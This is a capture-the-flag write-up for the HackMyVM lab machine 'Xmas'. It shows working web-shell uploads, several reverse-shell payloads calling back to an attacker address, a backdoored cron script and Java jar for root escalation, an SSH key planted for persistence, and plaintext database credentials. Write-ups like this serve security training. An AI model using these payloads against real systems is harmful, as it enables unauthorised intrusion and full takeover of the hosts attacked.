# XMAS

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.128:22
Open 10.0.2.128:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.128
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a6:3e:0b:65:85:2c:0c:5e:47:14:a9:dd:aa:d4:8c:60 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBB6Iuk2lt0gUkwd20LjylnFLItynNaqS7OuMGenbc2LNuIbmX/gZGLZtpZvdTiMtV/TQL1bAVcepNp2wlKDcOjw=
|   256 99:72:b5:6e:1a:9e:70:b3:24:e0:59:98:a4:f9:d1:25 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKoXAD4Qu41umJfR110GNdZPV8ldmZ8VSG0OhQyVO+Fw
80/tcp open  http    syn-ack Apache httpd 2.4.55
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.55 (Ubuntu)
|_http-title: Did not follow redirect to http://christmas.hmv
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

Add DNS host.

### Upload Bypass

There's an upload form on main page. 

![writeup.png](/assets/pentest/hackmyvm/xmas/writeup.png)

```bash
└─$ curl 'http://christmas.hmv/' -F 'file="GIF89;<?=`$_REQUEST[0]`?>"; type=image/gif; filename=t.php' -s | head -1
<p style='color:green;'>File uploaded successfully.</p>

└─$ curl 'http://christmas.hmv/uploads/t.php' -G --data-urlencode '0=id'
GIF89;uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### RCE (www-data)

```bash
└─$ curl 'http://christmas.hmv/uploads/t.php' -G --data-urlencode '0=busybox nc 10.0.2.15 4444 -e /bin/bash'
---
└─$ penelope -p 4444
www-data@xmas:/var/www/christmas.hmv/uploads$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```python
www-data@xmas:/opt/NiceOrNaughty$ cat nice_or_naughty.py
import mysql.connector
import random
import os

# Check the wish lists directory
directory = "/var/www/christmas.hmv/uploads"
# Connect to the mysql database christmas
mydb = mysql.connector.connect(
    host="localhost",
    user="root",
    password="ChristmasMustGoOn!",
    database="christmas"
)

#Read the names of the wish list
def read_names(directory):
    for filename in os.listdir(directory):
        full_path = os.path.join(directory, filename)
        if os.path.isfile(full_path):
            name, ext = os.path.splitext(filename)
            if any(char.isalnum() for char in name):
                status = random.choice(["nice", "naughty"])
                #print(f"{name} {status}")
                insert_data(name, status)
                os.remove(full_path)
            else:
                pass

        elif os.path.isdir(full_path):
            pass

# Insert name into the database
def insert_data(name, status):
    mycursor = mydb.cursor()
    sql = "INSERT INTO christmas (name, status) VALUES ( %s, %s)"
    val = (name, status)
    mycursor.execute(sql, val)
    mydb.commit()

#Generate printable Nice and Naughty list
def generate_lists():
    mycursor = mydb.cursor()

    # SQL query to fetch all names and status
    mycursor.execute("SELECT name, status FROM christmas")

    # Separate the nice and naughty lists
    nice_list = []
    naughty_list = []

    for (name, status) in mycursor:
        if status == "nice":
            nice_list.append(name)
        else:
            naughty_list.append(name)

    parent_directory = os.path.dirname(os.getcwd())
    file_path = "/home/alabaster/nice_list.txt"
    # Save the nice and naughty lists to separate txt files
    with open(file_path, "w") as file:
        for name in nice_list:
            file.write(f"{name}\n")
    file_path = "/home/alabaster/naughty_list.txt"
    with open(file_path, "w") as file:
        for name in naughty_list:
            file.write(f"{name}\n")

read_names(directory)
generate_lists()
```

Nothing much, but it's a cronjob script.
```bash
www-data@xmas:/opt/NiceOrNaughty$ mysql -u'root' -p'ChristmasMustGoOn!' -e 'SHOW DATABASES;'
+--------------------+
| Database           |
+--------------------+
| christmas          |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
www-data@xmas:/opt/NiceOrNaughty$ mysql -u'root' -p'ChristmasMustGoOn!' christmas -e 'SHOW TABLES;'
+---------------------+
| Tables_in_christmas |
+---------------------+
| christmas           |
+---------------------+
www-data@xmas:/opt/NiceOrNaughty$ mysql -u'root' -p'ChristmasMustGoOn!' christmas -e 'SELECT * FROM christmas;'
+----+-------------------+---------+
| id | name              | status  |
+----+-------------------+---------+
|  1 | Jesse Strange     | naughty |
|  2 | Kimberly Wininger | naughty |
|  3 | Brandy Homes      | nice    |
|  4 | kraken            | naughty |
|  5 | t                 | nice    |
|  6 | t                 | nice    |
|  7 | shell             | nice    |
|  8 | t                 | nice    |
|  9 | shell             | naughty |
| 10 | t                 | nice    |
+----+-------------------+---------+
```

## Lateral Movement (alabaster)

It's globally writable by all
```bash
www-data@xmas:/opt/NiceOrNaughty$ ls -alh nice_or_naughty.py
-rwxrwxrw- 1 root root 2.0K Nov 20  2023 nice_or_naughty.py
```

```bash
www-data@xmas:/opt/NiceOrNaughty$ echo '__import__("os").system("ls /tmp/letmein && busybox nc 10.0.2.15 4444 -e /bin/bash")' >> /opt/NiceOrNaughty/nice_or_naughty.py
www-data@xmas:/opt/NiceOrNaughty$ touch /tmp/letmein
---
└─$ curl 'http://christmas.hmv/' -F 'file="GIF89;<?=`$_REQUEST[0]`?>"; type=image/gif; filename=t.php' -s | head -1
```

Not positive why but the `os.system` didn't trigger at all. Use Python Reverse shell code
- [https://www.revshells.com](https://www.revshells.com)

```bash
www-data@xmas:/opt/NiceOrNaughty$ cat /opt/NiceOrNaughty/nice_or_naughty.py
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.15",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
---
alabaster@xmas:~$ id
uid=1000(alabaster) gid=1000(alabaster) groups=1000(alabaster),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
```

## SSH

Upgrade shell
```bash
└─$ ssh-keygen -f id_rsa -P x -q
echo "mkdir ~/.ssh; echo '$(cat id_rsa.pub)' >> ~/.ssh/authorized_keys"
mkdir ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEVM/fqiLIno2LerieyFph3Ha9SF3eRRQX3cwCxUjves woyag@kraken' >> ~/.ssh/authorized_keys
---
alabaster@xmas:~$ mkdir ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEVM/fqiLIno2LerieyFph3Ha9SF3eRRQX3cwCxUjves woyag@kraken' >> ~/.ssh/authorized_keys
```

```bash
└─$ ssh -i id_rsa alabaster@10.0.2.128
alabaster@xmas:~$ id
uid=1000(alabaster) gid=1000(alabaster) groups=1000(alabaster),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
```

### User.txt

```bash
alabaster@xmas:~$ cat user.txt
    ||::|:||   .--------,
    |:||:|:|   |_______ /        .-.
    ||::|:|| ."`  ___  `".    {\('v')/}
    \\\/\///:  .'`   `'.  ;____`(   )'___________________________
     \====/ './  o   o  \|~     ^" "^                          //
      \\//   |   ())) .  |   Merry Christmas!                   \
       ||     \ `.__.'  /|                                     //
       ||   _{``-.___.-'\|   Flag: HMV{7bMJ6js7guhQadYDTmBt}    \
       || _." `-.____.-'`|    ___                              //
       ||`        __ \   |___/   \______________________________\
     ."||        (__) \    \|     /
    /   `\/       __   vvvvv'\___/
    |     |      (__)        |
     \___/\                 /
       ||  |     .___.     |
       ||  |       |       |
       ||.-'       |       '-.
       ||          |          )
       ||----------'---------'
```

## Privilege Escalation

```bash
alabaster@xmas:~$ sudo -l
Matching Defaults entries for alabaster on xmas:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User alabaster may run the following commands on xmas:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /usr/bin/java -jar /home/alabaster/PublishList/PublishList.jar
```

```bash
alabaster@xmas:~$ cd PublishList/
alabaster@xmas:~/PublishList$ nano PublishList.java
public class PublishList {
    public static void main(String[] args) {
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/10.0.2.15/4444 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}
alabaster@xmas:~/PublishList$ javac PublishList.java
alabaster@xmas:~/PublishList$ jar -cfm PublishList.jar manifest.mf PublishList.class
alabaster@xmas:~/PublishList$ sudo java -jar /home/alabaster/PublishList/PublishList.jar
---
root@xmas:/home/alabaster/PublishList# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
root@xmas:/home/alabaster/PublishList# cat /root/root.txt
      __,_,_,___)          _______
    (--| | |             (--/    ),_)        ,_)
       | | |  _ ,_,_        |     |_ ,_ ' , _|_,_,_, _  ,
     __| | | (/_| | (_|     |     | ||  |/_)_| | | |(_|/_)___,
    (      |___,   ,__|     \____)  |__,           |__,

                            |                         _...._
                         \  _  /                    .::o:::::.
                          (\o/)                    .:::'''':o:.
                      ---  / \  ---                :o:_    _:::
                           >*<                     `:}_>()<_{:'
                          >0<@<                 @    `'//\\'`    @
                         >>>@<<*              @ #     //  \\     # @
                        >@>*<0<<<           __#_#____/'____'\____#_#__
                       >*>>@<<<@<<         [__________________________]
                      >@>>0<<<*<<@<         |=_- .-/\ /\ /\ /\--. =_-|
                     >*>>0<<@<<<@<<<        |-_= | \ \\ \\ \\ \ |-_=-|
                    >@>>*<<@<>*<<0<*<       |_=-=| / // // // / |_=-_|
      \*/          >0>>*<<@<>0><<*<@<<      |=_- |`-'`-'`-'`-'  |=_=-|
  ___\\U//___     >*>>@><0<<*>>@><*<0<<     | =_-| o          o |_==_|
  |\\ | | \\|    >@>>0<*<<0>>@<<0<<<*<@<    |=_- | !     (    ! |=-_=|
  | \\| | _(UU)_ >((*))_>0><*<0><@<<<0<*<  _|-,-=| !    ).    ! |-_-=|_
  |\ \| || / //||.*.*.*.|>>@<<*<<@>><0<<@</=-((=_| ! __(:')__ ! |=_==_-\
  |\\_|_|&&_// ||*.*.*.*|_\\db//__     (\_/)-=))-|/^\=^=^^=^=/^\| _=-_-_\
  """"|'.'.'.|~~|.*.*.*|     ____|_   =('.')=//   ,------------.
      |'.'.'.|   ^^^^^^|____|>>>>>>|  ( ~~~ )/   (((((((())))))))
      ~~~~~~~~         '""""`------'  `w---w`     `------------'
      Flag HMV{GUbM4sBXzvwf7eC9bNL4}
```